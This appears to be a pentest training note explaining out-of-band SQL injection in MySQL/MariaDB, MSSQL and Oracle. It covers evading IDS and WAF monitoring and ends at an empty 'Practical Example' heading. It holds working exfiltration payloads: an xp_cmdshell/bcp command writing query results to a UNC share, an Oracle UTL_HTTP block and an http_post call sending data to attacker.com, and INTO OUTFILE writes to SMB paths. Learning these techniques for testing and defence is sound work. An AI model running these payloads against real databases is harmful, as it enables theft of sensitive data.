Out-of-band (OOB) SQL injection is an attack technique that pentester/red teamers use to exfiltrate data or execute malicious actions when direct or traditional methods are ineffective. Unlike In-band SQL injection, where the attacker relies on the same channel for attack and data retrieval, Out-of-band SQL injection utilises separate channels for sending the payload and receiving the response. Out-of-band techniques leverage features like **HTTP** requests, **DNS** queries, **SMB** protocol, or other network protocols that the database server might have access to, enabling attackers to circumvent firewalls, intrusion detection systems, and other security measures.
	![](Pasted%20image%2020241211020203.png)

One of the key advantages of Out-of-band SQL injection is its stealth and reliability. By using **different communication channels**, attackers can minimise the risk of detection and maintain a persistent connection with the compromised system. For instance, an attacker might inject a **SQL payload that triggers the database server to make a DNS request** to a malicious domain controlled by the attacker. The response can then be used to extract sensitive data without alerting security mechanisms that monitor direct database interactions. This method allows attackers to exploit vulnerabilities even in complex network environments where direct connectivity between the attacker and the target is limited or scrutinised.

## Out-Of-Band usecase
In scenarios where direct responses are sanitised or limited by security measures, OOB channels enable attackers to exfiltrate data without immediate feedback from the server. For instance, security mechanisms like **stored procedures**, **output encoding**, and **application-level constraints** can **prevent direct responses**, making traditional SQL injection attacks ineffective. Out-of-band techniques, such as using DNS or HTTP requests, allow data to be sent to an external server controlled by the attacker, circumventing these restrictions.

Additionally, **Intrusion Detection Systems (IDS)** and **Web Application Firewalls (WAFs)** often **monitor and log SQL query responses for suspicious activity**, blocking direct responses from potentially malicious queries. By leveraging OOB channels, attackers can avoid detection by using less scrutinized network protocols like DNS or SMB to transfer data. This is particularly useful in network environments with limited direct connectivity between the attacker and the database server, such as when the server is behind a firewall or in a different network segment.

## Techniques in Different Databases
Out-of-band SQL injection attacks utilise the methodology of writing to another communication channel through a crafted query. This technique is effective for exfiltrating data or performing malicious actions when direct interaction with the database is restricted. There are multiple commands within a database that may allow exfiltration, but below is a list of the most commonly used in various database systems:

### **MySQL and MariaDB**
In MySQL or MariaDB, Out-of-band SQL injection can be achieved using [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) or [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:

```mysql
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.

### **Microsoft SQL Server (MSSQL)**
In MSSQL, Out-of-band SQL injection can be performed using features like [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:

```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.

### **Oracle**  
In Oracle databases, Out-of-band SQL injection can be executed using the [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) or [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:

```sql
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

## Examples of Out-of-band Techniques
Out-of-band SQL injection techniques in MySQL and MariaDB can utilise various network protocols to exfiltrate data. The primary methods include DNS exfiltration, HTTP requests, and SMB shares. Each of these techniques can be applied depending on the capabilities of the MySQL/MariaDB environment and the network setup.

### **HTTP Requests**
By leveraging database functions that allow HTTP requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outbound HTTP connections. Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.

First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like:
```sql
SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;
```

HTTP request exfiltration can be implemented on Windows and Linux (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enable HTTP requests.

### **DNS Exfiltration**
Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.

As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.

### **SMB Exfiltration**
SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like:

```sql
SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
```

This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools like `smbclient` or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.

## Practical Example
